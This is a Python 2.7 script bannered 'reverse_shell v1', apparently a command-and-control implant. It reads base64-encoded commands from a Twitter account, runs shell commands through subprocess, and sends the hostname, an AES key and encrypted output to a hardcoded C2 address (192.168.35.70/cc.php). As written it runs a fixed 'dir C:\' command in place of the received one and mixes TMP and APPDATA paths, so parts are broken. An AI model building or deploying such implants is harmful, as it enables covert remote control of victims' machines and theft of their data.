#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

# Import modules
import socket, sys, subprocess, os, requests, base64, time
from bs4 import BeautifulSoup

from Crypto.Cipher import AES
from Crypto import Random

# Variables
BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

base64pad = lambda s: s + '=' * (4 - len(s) % 4)
base64unpad = lambda s: s.rstrip("=")
encrypt_key = base64.b64encode(os.urandom(64)).decode('utf-8')[:32]

print unicode("╔", 'utf-8') + unicode("═", 'utf-8') * 78 + unicode("╗", 'utf-8')
print unicode("║", 'utf-8') + "                        _,.--.                                                " + unicode("║", 'utf-8')
print unicode("║", 'utf-8') + "    --..,_           .'`__ o  `;__, reverse_shell                             " + unicode("║", 'utf-8')
print unicode("║", 'utf-8') + "       `'.'.       .'.'`  '---'`  ' v1                                        " + unicode("║", 'utf-8')
print unicode("║", 'utf-8') + "          '.`-...-'.'                                                         " + unicode("║", 'utf-8')
print unicode("║", 'utf-8') + "            `-...-'                                                           " + unicode("║", 'utf-8')
print unicode("╚", 'utf-8') + unicode("═", 'utf-8') * 78 + unicode("╝", 'utf-8')

def get_twit():
	try:
		url = 'https://twitter.com/CommandControl2'
		data = requests.get(url)
		#print(data.text) 
		html = BeautifulSoup(data.text, 'html.parser')
		timeline = html.select('#timeline li.stream-item')
		tweet_text = timeline[0].select('p.tweet-text')[0].get_text()
		tweet_id = timeline[0]['data-item-id']
		return tweet_text, tweet_id
		pass
	except IndexError as e:
		return None, None
		pass
	pass

def stock_twit(id):
	with open(os.getenv('TMP') + "/tweets", "a") as text_file:
		text_file.write(id + "\n")
	pass

def decode(string):
	return base64.b64decode(string)
	pass

def send_output(data):
	data = {"computer":socket.gethostname(), "out":data + '\n'}
	r = requests.post("http://192.168.35.70/cc.php", data = data)
	print r.text
	pass

def run_command(string):
	process = subprocess.Popen(string, shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	out, err = process.communicate()
	return out, err
	pass

def encrypt(key, msg):
    iv = Random.new().read(BS)
    cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=AES.block_size * 8)
    encrypted_msg = cipher.encrypt(pad(str(msg)))
    return base64unpad(base64.urlsafe_b64encode(iv + encrypted_msg))

def main():
	send_output(encrypt_key)
	try:
		with open(os.getenv('APPDATA') + "/tweets", "r") as text_file:
			history = text_file.read().splitlines()
	except IOError:
		history = []
		pass
	while 1:
		command_encode, tweet_id = get_twit()
		if not command_encode is None and not tweet_id in history:
			history.append(tweet_id)
			#stock_twit(tweet_id)
			command = decode(command_encode)
			if command == 'exit':
				break;
				pass
			print command
			out, err = run_command("dir C:\\")
			send_output(encrypt(encrypt_key, out))
			pass
		time.sleep(5)
		pass

if __name__== "__main__":
	main()